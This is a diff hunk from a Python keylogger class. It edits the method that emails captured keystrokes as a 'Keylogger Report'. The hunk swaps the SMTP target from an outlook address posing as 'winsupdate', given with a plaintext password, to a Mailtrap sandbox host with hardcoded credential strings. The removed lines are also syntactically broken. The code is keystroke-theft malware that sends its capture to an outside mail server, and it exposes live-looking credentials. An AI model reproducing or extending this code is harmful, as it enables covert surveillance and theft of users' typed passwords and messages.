@@ -65,9 +65,9 @@ class KeyLogger:
         body = f"Keylogger Report:\n\n{message}"
         msg.attach(MIMEText(body, 'plain'))
 
-        with smtplib.SMTP('winsupdate00@outlook.com', 587) as server:
+        with smtplib.SMTP('sandbox.smtp.mailtrap.io', 587) as server:
             server.starttls()
-            server.login(winsupdate00@outlook.com,Logger1@12)
+            server.login(97e0da64b87710, aefa47a646ab58)
             server.sendmail(self.email, self.email, msg.as_string())
 
     def report(self):
